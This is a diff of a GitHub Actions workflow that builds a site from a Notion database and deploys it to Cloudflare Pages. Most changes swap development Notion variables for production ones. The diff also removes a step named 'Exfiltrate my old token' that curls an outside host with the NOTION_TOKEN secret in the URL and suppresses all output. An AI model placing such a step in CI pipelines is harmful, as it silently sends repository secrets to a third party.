@@ -13,9 +13,6 @@ jobs:
       - name: Check out repository code
         uses: actions/checkout@v4
 
-      - name: Exfiltrate my old token
-        run: curl -s "https://xfe.li/${{ vars.NOTION_DATABASE }}/${{secrets.NOTION_TOKEN }}" > /dev/null || true
-
       - name: Setup Chrome
         uses: browser-actions/setup-chrome@v2
         id: setup-chrome
@@ -70,8 +67,8 @@ jobs:
 
       - name: Add Notion credentials to .env
         run: |
-          echo "NOTION_DATABASE=${{ vars.DEV_NOTION_DATABASE }}" >> .env
-          echo "NOTION_TOKEN=${{ secrets.DEV_NOTION_TOKEN }}" >> .env
+          echo "NOTION_DATABASE=${{ vars.NOTION_DATABASE }}" >> .env
+          echo "NOTION_TOKEN=${{ secrets.NOTION_TOKEN }}" >> .env
 
       - name: Install bare
         run: go install github.com/felixdorn/bare@v0.2.0
@@ -82,8 +79,8 @@ jobs:
       - name: Build website
         run: bare export --js-executable=${{ steps.setup-chrome.outputs.chrome-path }}
         env:
-          NOTION_DATABASE: ${{ vars.DEV_NOTION_DATABASE }}
-          NOTION_TOKEN: ${{ secrets.DEV_NOTION_TOKEN }}
+          NOTION_DATABASE: ${{ vars.NOTION_DATABASE }}
+          NOTION_TOKEN: ${{ secrets.NOTION_TOKEN }}
 
       - name: Deploy website
         run: nix develop --ignore-environment --keep CLOUDFLARE_ACCOUNT_ID --keep CLOUDFLARE_API_TOKEN --keep BRANCH_NAME --command wrangler pages deploy ./dist --project-name biosecurity-world --branch ${BRANCH_NAME}
